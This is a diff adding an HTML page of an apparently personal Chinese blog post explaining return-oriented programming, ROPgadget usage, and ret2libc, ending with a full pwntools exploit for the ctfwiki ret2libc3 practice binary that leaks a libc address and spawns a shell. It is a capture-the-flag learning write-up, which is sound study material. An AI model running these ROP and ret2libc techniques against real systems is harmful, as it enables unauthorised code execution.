@@ -1,0 +1,426 @@
+<!DOCTYPE html>
+<html lang="en">
+    <head>
+    <meta charset="utf-8">
+
+    
+
+    <!-- 渲染优化 -->
+    <meta name="renderer" content="webkit">
+    <meta name="force-rendering" content="webkit">
+    <meta http-equiv="X-UA-Compatible" content="IE=Edge,chrome=1">
+    <meta name="HandheldFriendly" content="True" >
+    <meta name="apple-mobile-web-app-capable" content="yes">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+
+    <!--icon-->
+
+    
+        <link rel="shortcut icon" href="/images/favicon.ico">
+    
+    
+    
+    
+    
+
+
+    <!-- meta -->
+
+
+<title>ROP | Unbelievable</title>
+
+
+    <meta name="keywords" content="ROP">
+
+
+
+
+    <!-- OpenGraph -->
+ 
+    <meta name="description" content="What is ROPROP（返回导向编程），主要用来针对NX保护机制，当堆栈不可执行，就将栈溢出后返回地址导向程序已有指令，当这些指令都已ret指令结尾时（被称作gadget），则可通过组合串联执行达到某些目的。 ROPgadgetROPgadget工具可以自动扫描二进制文件中可供利用的gadget，甚至能自动构造利用链（懒狗福音，只是实际做题能遇见的不多就是了。。） ROP的内存布局示例pay">
+<meta property="og:type" content="article">
+<meta property="og:title" content="ROP">
+<meta property="og:url" content="https://majikoo1028.github.io/2021/08/05/ROP/index.html">
+<meta property="og:site_name" content="Unbelievable">
+<meta property="og:description" content="What is ROPROP（返回导向编程），主要用来针对NX保护机制，当堆栈不可执行，就将栈溢出后返回地址导向程序已有指令，当这些指令都已ret指令结尾时（被称作gadget），则可通过组合串联执行达到某些目的。 ROPgadgetROPgadget工具可以自动扫描二进制文件中可供利用的gadget，甚至能自动构造利用链（懒狗福音，只是实际做题能遇见的不多就是了。。） ROP的内存布局示例pay">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="https://majikoo1028.github.io/2021/08/05/ROP/1.jpg">
+<meta property="article:published_time" content="2021-08-05T01:03:39.000Z">
+<meta property="article:modified_time" content="2021-08-05T04:11:08.492Z">
+<meta property="article:author" content="Tobe.Unbelievable">
+<meta property="article:tag" content="ROP">
+<meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:image" content="https://majikoo1028.github.io/2021/08/05/ROP/1.jpg">
+
+
+    
+<link rel="stylesheet" href="/css/style/main.css">
+ 
+
+
+
+    
+    
+        <link rel="stylesheet" id="hl-default-theme" href="/css/highlight/tomorrow-night-eighties.css" media="none" onload="if(getComputedStyle(document.documentElement).getPropertyValue('--color-mode').indexOf('dark')===-1)this.media='all'">
+        
+    
+
+    
+    
+
+     
+
+    <!-- custom head -->
+
+<meta name="generator" content="Hexo 5.3.0"><link rel="alternate" href="/atom.xml" title="Unbelievable" type="application/atom+xml">
+</head>
+
+    <body>
+        <div id="app">
+            <header class="header">
+    <div class="header__left">
+        <a href="/" class="button">
+            <span class="logo__text">Unbelievable</span>
+        </a>
+    </div>
+    <div class="header__right">
+        
+            <div class="navbar__menus">
+                
+                    <a href="/" class="navbar-menu button">首页</a>
+                
+                    <a href="/tags/" class="navbar-menu button">标签</a>
+                
+                    <a href="/archives/" class="navbar-menu button">归档</a>
+                
+                    <a href="/friends/" class="navbar-menu button">友链</a>
+                
+                    <a href="/about/" class="navbar-menu button">关于</a>
+                
+            </div>
+        
+        
+        
+    <a href="/search/" id="btn-search">
+        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 1024 1024" width="24" height="24" fill="currentColor" stroke="currentColor" stroke-width="32"><path d="M192 448c0-141.152 114.848-256 256-256s256 114.848 256 256-114.848 256-256 256-256-114.848-256-256z m710.624 409.376l-206.88-206.88A318.784 318.784 0 0 0 768 448c0-176.736-143.264-320-320-320S128 271.264 128 448s143.264 320 320 320a318.784 318.784 0 0 0 202.496-72.256l206.88 206.88 45.248-45.248z"></path></svg>
+    </a>
+
+
+        
+        
+
+         
+    <a href="#" class="button" id="b2t" aria-label="Back to Top" title="Back to Top">
+        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 1024 1024" width="32" height="32">
+            <path d="M233.376 722.752L278.624 768 512 534.624 745.376 768l45.248-45.248L512 444.128zM192 352h640V288H192z" fill="currentColor"></path>
+        </svg>
+    </a>
+
+
+        
+            <a class="dropdown-icon button" id="btn-dropdown" tabindex="0"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 20 20" width='24' height='24' fill="none" stroke="currentColor" stroke-width="0.7" stroke-linecap="round" stroke-linejoin="round"><path fill="currentColor" d="M3.314,4.8h13.372c0.41,0,0.743-0.333,0.743-0.743c0-0.41-0.333-0.743-0.743-0.743H3.314c-0.41,0-0.743,0.333-0.743,0.743C2.571,4.467,2.904,4.8,3.314,4.8z M16.686,15.2H3.314c-0.41,0-0.743,0.333-0.743,0.743s0.333,0.743,0.743,0.743h13.372c0.41,0,0.743-0.333,0.743-0.743S17.096,15.2,16.686,15.2z M16.686,9.257H3.314c-0.41,0-0.743,0.333-0.743,0.743s0.333,0.743,0.743,0.743h13.372c0.41,0,0.743-0.333,0.743-0.743S17.096,9.257,16.686,9.257z"></path></svg></a>
+            <div class="dropdown-menus" id="dropdown-menus">
+                
+                    <a href="/" class="dropdown-menu button">首页</a>
+                
+                    <a href="/tags/" class="dropdown-menu button">标签</a>
+                
+                    <a href="/archives/" class="dropdown-menu button">归档</a>
+                
+                    <a href="/friends/" class="dropdown-menu button">友链</a>
+                
+                    <a href="/about/" class="dropdown-menu button">关于</a>
+                
+            </div>
+        
+    </div>
+</header>
+
+
+            <main class="main">
+    
+
+<div class="post-title">
+    <h1 class="post-title__text">
+        ROP
+    </h1>
+    <div class="post-title__meta">
+        <a href="/archives/2021/08/" class="post-meta__date button">2021-08-05</a>
+        
+ 
+        
+    
+    
+
+
+ 
+
+ 
+    </div>
+</div>
+
+
+    <aside class="post-side">
+        <div class="post-side__toc">
+            <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#What-is-ROP"><span class="toc-number">1.</span> <span class="toc-text">What is ROP</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#ROPgadget"><span class="toc-number">2.</span> <span class="toc-text">ROPgadget</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#ROP%E7%9A%84%E5%86%85%E5%AD%98%E5%B8%83%E5%B1%80%E7%A4%BA%E4%BE%8B"><span class="toc-number">2.1.</span> <span class="toc-text">ROP的内存布局示例</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%97%A5%E5%B8%B8%E4%BD%BF%E7%94%A8"><span class="toc-number">2.2.</span> <span class="toc-text">日常使用</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#ret2libc"><span class="toc-number">3.</span> <span class="toc-text">ret2libc</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#libc%E7%AE%80%E4%BB%8B"><span class="toc-number">3.1.</span> <span class="toc-text">libc简介</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%B8%80%E8%88%AC%E7%9A%84%E5%88%A9%E7%94%A8%E5%A5%97%E8%B7%AF"><span class="toc-number">3.2.</span> <span class="toc-text">一般的利用套路</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%B8%80%E9%81%93%E4%BE%8B%E9%A2%98ctfwiki-ret2libc3"><span class="toc-number">3.3.</span> <span class="toc-text">一道例题ctfwiki-ret2libc3</span></a></li></ol></li></ol>
+        </div>
+    </aside>
+    <a class="btn-toc button" id="btn-toc" tabindex="0">
+        <svg viewBox="0 0 1024 1024" width="32" height="32" xmlns="http://www.w3.org/2000/svg">
+            <path d="M128 256h64V192H128zM320 256h576V192H320zM128 544h64v-64H128zM320 544h576v-64H320zM128 832h64v-64H128zM320 832h576v-64H320z" fill="currentColor"></path>
+        </svg>
+    </a>
+    <div class="toc-menus" id="toc-menus">
+        <div class="toc-title">Article Directory</div>
+        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#What-is-ROP"><span class="toc-number">1.</span> <span class="toc-text">What is ROP</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#ROPgadget"><span class="toc-number">2.</span> <span class="toc-text">ROPgadget</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#ROP%E7%9A%84%E5%86%85%E5%AD%98%E5%B8%83%E5%B1%80%E7%A4%BA%E4%BE%8B"><span class="toc-number">2.1.</span> <span class="toc-text">ROP的内存布局示例</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%97%A5%E5%B8%B8%E4%BD%BF%E7%94%A8"><span class="toc-number">2.2.</span> <span class="toc-text">日常使用</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#ret2libc"><span class="toc-number">3.</span> <span class="toc-text">ret2libc</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#libc%E7%AE%80%E4%BB%8B"><span class="toc-number">3.1.</span> <span class="toc-text">libc简介</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%B8%80%E8%88%AC%E7%9A%84%E5%88%A9%E7%94%A8%E5%A5%97%E8%B7%AF"><span class="toc-number">3.2.</span> <span class="toc-text">一般的利用套路</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%B8%80%E9%81%93%E4%BE%8B%E9%A2%98ctfwiki-ret2libc3"><span class="toc-number">3.3.</span> <span class="toc-text">一道例题ctfwiki-ret2libc3</span></a></li></ol></li></ol>
+    </div>
+
+
+<article class="post content-card">
+    <div class="post__header"></div>
+    <div class="post__content">
+        <h2 id="What-is-ROP"><a href="#What-is-ROP" class="headerlink" title="What is ROP"></a>What is ROP</h2><p>ROP（返回导向编程），主要用来针对NX保护机制，当堆栈不可执行，就将栈溢出后返回地址导向程序已有指令，当这些指令都已<code>ret</code>指令结尾时（被称作gadget），则可通过组合串联执行达到某些目的。</p>
+<h2 id="ROPgadget"><a href="#ROPgadget" class="headerlink" title="ROPgadget"></a>ROPgadget</h2><p>ROPgadget工具可以自动扫描二进制文件中可供利用的gadget，甚至能自动构造利用链（懒狗福音，只是实际做题能遇见的不多就是了。。）</p>
+<h3 id="ROP的内存布局示例"><a href="#ROP的内存布局示例" class="headerlink" title="ROP的内存布局示例"></a>ROP的内存布局示例</h3><p>payload中各条gadget地址与其参数（通常用于pop指令）布局大致如下</p>
+<p><img src="/2021/08/05/ROP/1.jpg" alt="1"></p>
+<h3 id="日常使用"><a href="#日常使用" class="headerlink" title="日常使用"></a>日常使用</h3><div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="SH"><figure class="iseeu highlight /sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="comment"># 扫描所有可利用的gadget</span></span><br><span class="line">ROPgadget --binary file</span><br><span class="line"></span><br><span class="line"><span class="comment"># 搜索能存储指定寄存器的gadget</span></span><br><span class="line">ROPgadget --binary file --only <span class="string">&#x27;pop|ret&#x27;</span> | grep <span class="string">&#x27;eax&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 搜索字符串</span></span><br><span class="line">ROPgadget --binary rop --string <span class="string">&quot;/bin/sh&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 查找含有指定内容的</span></span><br><span class="line">ROPgadget --binary file --only <span class="string">&#x27;XX&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 自动构造利用链（get shell），一般静态链接的文件才好用？</span></span><br><span class="line">ROPgadget --binary file --ropchain</span><br><span class="line"></span><br></pre></td></tr></table></figure></div>
+<h2 id="ret2libc"><a href="#ret2libc" class="headerlink" title="ret2libc"></a>ret2libc</h2><p>简单的<strong>ret2text</strong>和<strong>ret2shellcode</strong>就不说了，主要讲一讲ret2libc的东西</p>
+<h3 id="libc简介"><a href="#libc简介" class="headerlink" title="libc简介"></a>libc简介</h3><p>要讲ret2libc就得先理解libc与可执行文件的关系，下面讲的也只是我目前的理解（如有误请指正）</p>
+<blockquote>
+<p>一个动态链接的可执行文件和libc的关系大概就是，可执行文件运行时所需的共享对象会被链接到文件中，但其实整个libc都被加载在了虚拟内存中（这时还没有为其分配真正的物理内存，等切时要执行时才分配），这才有了ret2libc的可能。而有些可执行文件里面能被IDA加载后静态看得见的那些libc函数，都是文件中实际包含的，而没有的libc函数如<code>system</code>在确定libc在内存中的实际地址和函数偏移后一样可以利用。</p>
+</blockquote>
+<h3 id="一般的利用套路"><a href="#一般的利用套路" class="headerlink" title="一般的利用套路"></a>一般的利用套路</h3><p>当二进制文件中没有明显的后门函数，而又开启了NX保护不能直接注入shellcode执行。可以利用ROP链泄露已执行过的一些函数的实际地址，再用<strong>LibrarySearcher</strong>匹配找到对应libc，算出该<strong>函数在虚拟内存中的实际地址</strong>与<strong>在libc中的地址</strong>的<strong>偏移</strong>即可算出我们想要利用的libc函数在内存中的实际地址。</p>
+<blockquote>
+<ul>
+<li>system 函数属于 libc，而 libc.so 动态链接库中的函数之间相对偏移是固定的。</li>
+<li>即使程序有 ASLR 保护，也只是针对于地址中间位进行随机，最低的 12 位并不会发生改变。</li>
+</ul>
+<p>—— ctfwiki</p>
+</blockquote>
+<h3 id="一道例题ctfwiki-ret2libc3"><a href="#一道例题ctfwiki-ret2libc3" class="headerlink" title="一道例题ctfwiki-ret2libc3"></a>一道例题ctfwiki-ret2libc3</h3><div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PYTHON"><figure class="iseeu highlight /python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> LibcSearcher</span><br><span class="line">sh = process(<span class="string">&#x27;./ret2libc3&#x27;</span>)</span><br><span class="line"></span><br><span class="line">ret2libc3 = ELF(<span class="string">&#x27;./ret2libc3&#x27;</span>)</span><br><span class="line"></span><br><span class="line">puts_plt = ret2libc3.plt[<span class="string">&#x27;puts&#x27;</span>]       <span class="comment"># 利用已执行过的puts函数泄露GOT表</span></span><br><span class="line">libc_start_main_got = ret2libc3.got[<span class="string">&#x27;__libc_start_main&#x27;</span>]   <span class="comment"># 这里的选择比较多，put_got也行</span></span><br><span class="line">main = ret2libc3.symbols[<span class="string">&#x27;main&#x27;</span>]</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span> <span class="string">&quot;leak libc_start_main_got addr and return to main again&quot;</span></span><br><span class="line">payload = flat([<span class="string">&#x27;A&#x27;</span> * <span class="number">112</span>, puts_plt, main, libc_start_main_got])</span><br><span class="line">sh.sendlineafter(<span class="string">&#x27;Can you find it !?&#x27;</span>, payload)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span> <span class="string">&quot;get the related addr&quot;</span></span><br><span class="line">libc_start_main_addr = u32(sh.recv()[<span class="number">0</span>:<span class="number">4</span>])        <span class="comment"># puts输出的回显前4即为我们想要得到的libc_start_main_addr实际地址</span></span><br><span class="line">libc = LibcSearcher(<span class="string">&#x27;__libc_start_main&#x27;</span>, libc_start_main_addr) <span class="comment"># 用函数名和实际地址来匹配获取libc</span></span><br><span class="line">libcbase = libc_start_main_addr - libc.dump(<span class="string">&#x27;__libc_start_main&#x27;</span>) <span class="comment"># 偏移计算</span></span><br><span class="line">system_addr = libcbase + libc.dump(<span class="string">&#x27;system&#x27;</span>)</span><br><span class="line">binsh_addr = libcbase + libc.dump(<span class="string">&#x27;str_bin_sh&#x27;</span>)         <span class="comment"># 获取system函数和&#x27;/bin/sh&#x27;的实际地址</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span> <span class="string">&quot;get shell&quot;</span></span><br><span class="line">payload = flat([<span class="string">&#x27;A&#x27;</span> * <span class="number">104</span>, system_addr, <span class="number">0xdeadbeef</span>, binsh_addr])  <span class="comment"># 打！</span></span><br><span class="line">sh.sendline(payload)</span><br><span class="line"></span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure></div>
+
+
+
+    </div>
+     
+    <div class="post-footer__meta"><p>updated at 2021-08-05</p></div> 
+    <div class="post-meta__cats"><a href="/tags/ROP/" class="post-tags__link button"># ROP</a></div> 
+</article>
+
+
+    <div class="nav">
+        <div class="nav__prev">
+            
+        </div>
+        <div class="nav__next">
+            
+                <a href="/2021/07/31/%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2/" class="nav__link">
+                    <div>
+                        <div class="nav__label">
+                            Next Post
+                        </div>
+                        <div class="nav__title">
+                            格式化字符串
+                        </div>
+                    </div>
+                    <div>
+                        <svg viewBox="0 0 1024 1024" xmlns="http://www.w3.org/2000/svg" width="24" height="24"><path d="M434.944 790.624l-45.248-45.248L623.04 512l-233.376-233.376 45.248-45.248L713.568 512z" fill="#808080"></path></svg>
+                    </div>
+                </a>
+            
+        </div>
+    </div>
+
+
+
+    <div class="post__comments content-card" id="comment">
+        
+    <h4>Comments</h4>
+    
+    
+    
+    <div id="valine_container" class="valine_thread"></div>
+
+    
+    
+    
+    
+    
+    
+    
+
+
+    </div>
+
+
+
+</main>
+
+
+            <footer class="footer">
+    
+
+
+    
+     
+ 
+
+ 
+    
+        
+        <link rel="stylesheet" href="/live2d/css/live2d.css" />
+    <div id="landlord">
+        <div class="message" style="opacity:0"></div>
+        <canvas id="live2d" width="280" height="250" class="live2d"></canvas>
+        <div class="hide-button">隐藏</div>
+    </div>
+    <script type="text/javascript" src="https://cdn.bootcss.com/jquery/2.2.4/jquery.min.js"></script>
+    <script type="text/javascript">
+        var message_Path = '/live2d/'
+        var home_Path = 'https://unbelievable.cool/'
+    </script>
+    <script type="text/javascript" src="/live2d/js/live2d.js"></script>
+    <!--<script type="text/javascript" src="/live2d/js/message.js"></script>-->
+    <script type="text/javascript">
+        loadlive2d("live2d", "/live2d/model/shifuku/shifuku.model.json");
+    </script>
+        <p class="footer-copyright">
+            Copyright © 2021&nbsp;-&nbsp;2021 <a href="/">Unbelievable</a>
+        </p>
+    
+    
+    <p>Powered by <a href="https://hexo.io" target="_blank">Hexo</a> | Theme - <a href="https://github.com/ChrAlpha/hexo-theme-cards" target="_blank">Cards</a></p>
+</footer>
+
+        </div>
+         
+
+ 
+
+ 
+
+ 
+
+  
+
+
+
+ 
+
+
+    
+ 
+
+
+    
+<script src="https://cdn.jsdelivr.net/npm/jquery@3.4.1/dist/jquery.min.js"></script>
+
+    
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@3.4.1/dist/jquery.fancybox.min.css">
+
+    
+<script src="https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@3.4.1/dist/jquery.fancybox.min.js"></script>
+
+    <script>
+        let lazyloadT = Boolean('false'),
+            auto_fancybox = Boolean('true')
+        if (auto_fancybox) {
+            $(".post__content").find('img').each(function () {
+                var element = document.createElement("a");
+                $(element).attr("data-fancybox", "gallery");
+                $(element).attr("href", $(this).attr("src"));
+                if (lazyloadT) {
+                    $(element).attr("href", $(this).attr("data-srcset"));
+                }
+                $(this).wrap(element);
+            });
+        } else {
+            $(".post__content").find("fancybox").find('img').each(function () {
+                var element = document.createElement("a");
+                $(element).attr("data-fancybox", "gallery");
+                $(element).attr("href", $(this).attr("src"));
+                if (lazyloadT) {
+                    $(element).attr("href", $(this).attr("data-srcset"));
+                }
+                $(this).wrap(element);
+            });
+        }
+    </script>
+ 
+
+ 
+
+ 
+
+
+    <script>
+        window.onload = () => {
+            document.querySelectorAll('.sliding-fold').forEach((item) => {
+                item.querySelector('summary').onclick = () => {
+                    item.classList.toggle("collapsed");
+                    item.classList.toggle("expanded");
+                };
+            });
+        };
+    </script>
+ 
+
+
+    
+
+    
+    
+    
+    <script>
+        function loadComment() {
+            let e;
+            (e = document.createElement("script")).src = 'https://cdn.jsdelivr.net/npm/valine@1.4.14/dist/Valine.min.js',
+            document.body.appendChild(e);
+            e.onload = () => {
+                var valineConfig = {"appId":"3IAE9kFUvNz7NdN7PcECz4Xj-gzGzoHsz","appKey":"9EEiERWEkTIdpRtAlNy7160Q","placeholder":"冲！","path":null,"avatar":"hide","meta":["nick","mail","link"],"pageSize":null,"lang":null,"visitor":null,"highlight":null,"avatarForce":null,"recordIP":null,"serverURLs":null,"enableQQ":null,"requiredFields":["nick","mail"],"emojiCDN":null,"emojiMaps":null};
+                valineConfig.el = '#valine_container';
+                for (var i in valineConfig) {
+                    if (valineConfig[i] === null) delete valineConfig[i];
+                }
+                new Valine(valineConfig);
+            };
+        }
+    
+        var runningOnBrowser = typeof window !== "undefined";
+        var isBot = runningOnBrowser && !("onscroll" in window) || typeof navigator !== "undefined" && /(gle|ing|ro|msn)bot|crawl|spider|yand|duckgo/i.test(navigator.userAgent);
+        var supportsIntersectionObserver = runningOnBrowser && "IntersectionObserver" in window;
+    
+        setTimeout(function () {
+            if (!isBot && supportsIntersectionObserver) {
+                var comment_observer = new IntersectionObserver(function(entries) {
+                    if (entries[0].isIntersecting) {
+                        loadComment();
+                        comment_observer.disconnect();
+                    }
+                }, { threshold: [0] });
+                comment_observer.observe(document.getElementById('comment'));
+            } else {
+                loadComment();
+            }
+        }, 1);
+    </script>
+
+
+    
+    
+    
+    
+    
+
+    
+    
+    
+    
+    
+
+    
+
+
+
+    </body>
+</html>
